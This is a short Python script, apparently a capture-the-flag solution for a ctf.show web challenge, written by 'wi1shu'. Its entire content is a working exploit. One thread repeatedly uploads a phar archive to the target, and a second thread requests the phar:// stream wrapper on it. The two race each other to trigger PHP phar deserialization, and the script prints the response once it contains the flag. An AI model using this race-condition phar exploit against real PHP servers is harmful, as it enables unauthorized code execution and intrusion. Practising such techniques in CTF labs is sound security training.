#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# @Project -> File     ：fwQQBot -> phar.py         
# @IDE      ：PyCharm
# @Author   ：wi1shu
# @Date     ：2023/6/27 22:48
# @Software : win10 python3.6
import requests
import threading

flag = False
url = "http://aa825c24-9293-4ac8-bfdd-30dac7312bbc.challenge.ctf.show/"
data = open('./phar123.phar', 'rb').read()

pre_resp = requests.get(url)
if pre_resp.status_code != 200:
    print(url + '\n链接好像挂了....')
    exit(1)

def upload():
    global flag
    while not flag:
        requests.post(url+"?fn=phar.phar", data=data)


def read():
    global flag
    while not flag:
        r = requests.post(url+"?fn=phar://phar.phar/", data="")
        if "ctfshow{" in r.text and flag is False:
            print(r.text)
            flag = True

if __name__ == "__main__":
    a = threading.Thread(target=upload)
    b = threading.Thread(target=read)
    a.start()
    b.start()
    a.join()
    b.join()

